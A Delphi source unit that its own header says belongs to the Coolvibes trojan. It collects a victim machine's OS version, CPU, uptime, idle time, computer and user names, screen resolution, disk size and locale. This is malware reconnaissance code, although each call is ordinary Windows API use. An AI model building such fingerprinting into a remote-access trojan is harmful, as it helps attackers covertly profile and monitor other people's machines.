{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
relaccionadas con la obtención de información del sistema remoto}
unit UnitSystemInfo;

interface

uses
  Windows,
  SysUtils,
  UnitFunciones,
  UnitVariables,
  UnitFileManager;

function GetOS(): string;
function GetCPU(): string;
function GetUptime(): string;
function GetIdleTime(): string;
function GetPCName(): string;
function GetPCUser(): string;
function GetResolucion(): string;
function GetTamanioDiscos(): string;
function GetIdioma(): string;

implementation

function GetOS(): string;
var
  osVerInfo: TOSVersionInfo;
begin
  if (Sistema_operativo <> '') then
    begin
      Result := Sistema_operativo;
      Exit;
    end;
  Result := 'Desconocido';
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  GetVersionEx(osVerInfo);
  case osVerInfo.dwPlatformId of
    VER_PLATFORM_WIN32_NT:
      begin
        case osVerInfo.dwMajorVersion of
          4: Result := 'Windows NT 4.0';
          5: case osVerInfo.dwMinorVersion of
              0: Result := 'Windows 2000';
              1: Result := 'Windows XP';
              2: Result := 'Windows Server 2003';
            end;
          6: case osVerInfo.dwMinorVersion of
              0: Result := 'Windows Vista';
              1: Result := 'Windows 7';
            end;
        end;
      end;
    VER_PLATFORM_WIN32_WINDOWS:
      begin
        case osVerInfo.dwMinorVersion of
          0: Result := 'Windows 95';
          10: Result := 'Windows 98';
          90: Result := 'Windows Me';
        end;
      end;
  end;
  if osVerInfo.szCSDVersion <> '' then
    Result := Result + ' ' + osVerInfo.szCSDVersion;

  Sistema_operativo := Result;
end;

function GetCPU(): string;
begin
  if (CPU <> '') then
    begin
      Result := CPU;
      Exit;
    end;
  //Trim quita los espacios antes y despues de la cadena, ejem "    CPU p6 2000  " , con trim "CPU p6 2000"
  Result := Trim(GetClave(HKEY_LOCAL_MACHINE,
    'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString'));
  CPU := Result;
end;

function GetUptime(): string;
var
  Tiempo, Dias, Horas, Minutos: Cardinal;
begin
  Tiempo := GetTickCount();
  Dias := Tiempo div (1000 * 60 * 60 * 24);
  Tiempo := Tiempo - Dias * (1000 * 60 * 60 * 24);
  Horas := Tiempo div (1000 * 60 * 60);
  Tiempo := Tiempo - Horas * (1000 * 60 * 60);
  Minutos := Tiempo div (1000 * 60);
  Result := IntToStr(Dias) + 'd ' + IntToStr(Horas) + 'h ' + IntToStr(Minutos) + 'm';
end;

function getIdleTime(): string;
var
  liInfo: TLastInputInfo;
  Hour, Min, Sec: Integer;
begin
  Result := '';
  liInfo.cbSize := SizeOf(TLastInputInfo);
  if GetLastInputInfo(liInfo) <> False then
    begin
      Sec := (GetTickCount - liInfo.dwTime) div 1000;
      Min := Sec div 60;
      Sec := Sec mod 60;
      Hour := Min div 60;
      Min := Min mod 60;

      if Hour < 10 then
        Result := Result + '0' + IntToStr(Hour)
      else
        Result := Result + IntToStr(Hour);

      if Min < 10 then
        Result := Result + ':0' + IntToStr(Min)
      else
        Result := Result + ':' + IntToStr(Min);

      if Sec < 10 then
        Result := Result + ':0' + IntToStr(Sec)
      else
        Result := Result + ':' + IntToStr(Sec);

      //   Result := Result + ' (hh:mm:ss)';
    end;
end;

function GetPCName(): string;
var
  PC: PChar;
  Tam: Cardinal;
begin
  Tam := 100;
  Getmem(PC, Tam);
  GetComputerName(PC, Tam);
  Result := PC;
  FreeMem(PC);
end;

function GetPCUser(): string;
var
  User: PChar;
  Tam: Cardinal;
begin
  Tam := 100;
  Getmem(User, Tam);
  GetUserName(User, Tam);
  Result := User;
  FreeMem(User);
end;

function GetResolucion(): string;
begin
  Result := IntToStr(AnchuraPantalla()) + 'x' + IntToStr(AlturaPantalla());
end;

function GetTamanioDiscos(): string;
var
  Tam: Int64;
begin
  GetDrives(Tam);
  Result := IntToStr(Tam);
end;

function GetIdioma(): string;
var
  langid: Cardinal;
  CountryName: array[0..4] of char;
  LanguageName: array[0..4] of char;
  works: Boolean;
begin
  // The return value of GetLocaleInfo is compared with 3 = 2 characters and a zero
  works := 3 = GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, LanguageName, SizeOf(LanguageName));
  works := works and (3 = GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, CountryName, SizeOf(CountryName)));
  if works then
    begin
      Result := PChar(@LanguageName[0]) + '_' + PChar(@CountryName[0]);
    end;
end;
end.
